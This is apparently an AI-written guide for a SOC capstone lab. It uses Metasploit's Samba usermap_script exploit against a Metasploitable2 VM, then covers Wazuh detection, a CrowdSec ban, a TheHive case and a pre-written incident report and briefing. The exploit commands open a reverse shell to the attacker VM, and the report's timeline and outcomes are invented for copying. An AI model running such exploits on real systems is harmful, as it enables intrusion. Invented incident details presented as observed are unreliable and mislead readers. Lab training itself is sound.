# Capstone Project: Full SOC Workflow Simulation Guide

**Disclaimer:** This document is a guide designed to help you execute the capstone project in your authorized lab environment. As an AI, I cannot execute attacks, run lab components on your host, or generate real-time screenshots. The commands provided here are strictly for educational purposes against explicitly vulnerable training VMs (Metasploitable2). You will need to take the screenshots as you follow these steps.

## Phase 1: Attack Simulation
**Objective:** Exploit a Metasploitable2 vulnerability with Metasploit.
**Tool:** Metasploit

1. Log into your attacker VM (e.g., Kali Linux).
2. Launch the Metasploit console by typing:
   ```bash
   msfconsole
   ```
3. Load the designated module (Samba usermap script):
   ```bash
   use exploit/multi/samba/usermap_script
   ```
4. Configure the required parameters (replace with your lab IPs):
   ```bash
   set RHOSTS 10.98.90.150
   set LHOST 10.98.90.219
   ```
5. Execute the exploit:
   ```bash
   exploit
   ```
6. *Screenshot Requirement:* Take a snapshot of the terminal showing the resulting `Command Shell` or `Meterpreter` session indicating successful exploitation.

---

## Phase 2: Detection and Triage
**Objective:** Configure Wazuh to alert on the attack and extract the log.
**Tool:** Wazuh

1. Ensure the Wazuh agent is installed and running on the system monitoring your network/target.
2. In the Wazuh dashboard, navigate to the **Security events** or **Threat Hunting** tab.
3. Filter events by the attack timestamp or the attacker IP (`10.98.90.219`).
4. Locate the alert related to the Samba exploit.
5. *Screenshot Requirement:* Take a screenshot of the Wazuh dashboard showing this alert.

**Documented Alert Table:**
| Timestamp            | Source IP      | Alert Description | MITRE Technique |
|----------------------|----------------|-------------------|-----------------|
| 2026-03-24 12:01:00  | 10.98.90.219   | Samba exploit     | T1210           |

---

## Phase 3: Response and Containment
**Objective:** Isolate the VM and block the attacker's IP.
**Tool:** CrowdSec

1. Access the machine running CrowdSec.
2. Add a manual decision to ban the attacker's IP address:
   ```bash
   cscli decisions add --ip 10.98.90.219 --duration 24h --type ban
   ```
3. Test the block from the attacker VM by pinging the target:
   ```bash
   ping 10.98.90.150
   ```
4. *Screenshot Requirement:* Take a screenshot of the terminal showing the `cscli decisions list` command verifying the ban AND the failed ping test returning timeouts.

---

## Phase 4: Escalation
**Objective:** Escalate to Tier 2 via TheHive.
**Tool:** TheHive

**100-word Case Summary:**
> **Title:** High Severity - Successful Samba Usermap Script Exploitation
> 
> **Summary:** On March 24, 2026, Wazuh alerted on suspicious activity originating from source IP 10.98.90.219 targeting the Metasploitable2 server at 10.98.90.150. Initial triage confirmed successful exploitation of the Samba usermap script vulnerability (CVE-2007-2447), corresponding to MITRE ATT&CK Technique T1210 (Exploitation of Remote Services). The attacker successfully obtained a reverse shell, indicating complete system compromise. Immediate containment actions were executed utilizing CrowdSec to instantly ban the malicious source IP and isolate the affected virtual machine from the broader network. This incident is being escalated to Tier 2 for in-depth forensic analysis and remediation planning.
>
> *Take a screenshot of this case created in TheHive dashboard.*

---

## Phase 5: Reporting
**Objective:** Write a comprehensive incident report.
**Tool:** Google Docs (Copy the text below into your document)

**Incident Report (SANS Format)**

**1. Executive Summary:**
On March 24, 2026 at approximately 12:00 PM, the SOC detected a critical security incident involving the exploitation of a known vulnerability (CVE-2007-2447) on a target server. An external attacker successfully leveraged the Samba usermap script vulnerability to gain unauthorized remote command execution. Immediate containment measures were enforced using CrowdSec, limiting the blast radius and preventing further unauthorized access. 

**2. Timeline of Events:**
*   **11:55 AM:** Attacker initiated reconnaissance against the target server 10.98.90.150.
*   **12:00 PM:** Attacker executed the Metasploit `usermap_script` module.
*   **12:01 PM:** Wazuh generated a critical alert regarding the Samba exploit mapping to MITRE T1210.
*   **12:10 PM:** The SOC analyst verified the successful reverse shell connection.
*   **12:15 PM:** Containment enacted. The attacker IP 10.98.90.219 was banned network-wide using CrowdSec.

**3. Recommendations:**
*   **Patching:** Immediately patch or update Samba to a secure version immune to CVE-2007-2447.
*   **Network Segmentation:** Ensure that vulnerable training or legacy systems are strictly isolated from production environments.
*   **Vulnerability Scanning:** Schedule automated weekly vulnerability scans to identify and remediate end-of-life or unpatched software before they can be exploited.

---

## Phase 6: Briefing
**Objective:** Draft a briefing for a non-technical manager.

**100-word Management Briefing:**
> **Subject:** Security Incident Briefing: Contained Server Compromise
> 
> **Briefing:** Earlier today, our monitoring systems identified an unauthorized individual attempting to access one of our internal servers. The attacker exploited an outdated software component to gain entry. Fortunately, our automated defense mechanisms immediately flagged the activity. Our security team responded proactively by severing the attacker's connection and completely blocking their access to our network. We have isolated the impacted server to ensure no further risk to our operations. We are currently updating the outdated software to permanently fix the issue and prevent recurrence. No sensitive customer data was exposed during this historically isolated event.
